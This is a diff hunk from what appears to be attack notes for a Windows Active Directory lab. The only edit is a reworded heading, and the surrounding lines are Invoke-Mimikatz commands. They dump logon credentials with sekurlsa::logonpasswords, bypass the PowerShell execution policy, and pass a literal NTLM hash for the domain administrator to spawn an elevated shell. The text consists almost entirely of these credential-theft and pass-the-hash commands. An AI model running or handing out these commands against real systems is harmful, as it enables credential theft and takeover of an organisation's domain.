@@ -190,8 +190,8 @@ To get administrator NTLM hash
 ------------------------------
 [seclogs.research.Security.local]: PS C:\> Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
 
-To use domain admin's NTLM hash and get administrative access
----------------------------------------------------------------
+To use domain admin's NTLM hash and get administrative access ( **** open new powershell with the administrator access **** )
+------------------------------------------------------------------------------------------------------------------------------
 C:\> powershell -ep bypass
 C:\> . .\Invoke-Mimikatz.ps1
 C:\> Invoke-Mimikatz -Command '"sekurlsa::pth /user:administrator /domain:research.security.local /ntlm:84398159ce4d01cfe10cf34d5dae3909 /run:powershell.exe"'
